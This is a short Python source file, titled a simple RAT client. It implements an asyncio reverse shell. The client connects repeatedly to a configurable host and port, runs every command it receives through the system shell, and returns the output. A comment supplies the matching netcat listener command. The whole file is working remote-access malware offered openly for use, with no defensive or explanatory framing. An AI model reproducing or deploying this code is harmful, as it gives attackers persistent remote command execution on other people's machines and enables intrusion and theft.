# RAT client simple — asyncio reverse shell Python 3.10+
# listener: nc -lvnp 4444
import asyncio, subprocess

HOST = "127.0.0.1"
PORT = 4444
RECONNECT_DELAY = 5

async def shell(reader, writer):
    while True:
        try: data = await asyncio.wait_for(reader.read(4096), timeout=30)
        except asyncio.TimeoutError: continue
        if not data: break
        cmd = data.decode(errors="replace").strip()
        if cmd.lower() in ("exit","quit"): break
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=15)
            out = r.stdout + r.stderr
        except subprocess.TimeoutExpired: out = "[timeout]\n"
        except Exception as e: out = f"[error] {e}\n"
        writer.write((out or "[no output]\n").encode())
        await writer.drain()
    writer.close()

async def connect():
    while True:
        try:
            r, w = await asyncio.open_connection(HOST, PORT)
            await shell(r, w)
        except (ConnectionRefusedError, OSError): pass
        await asyncio.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    asyncio.run(connect())
    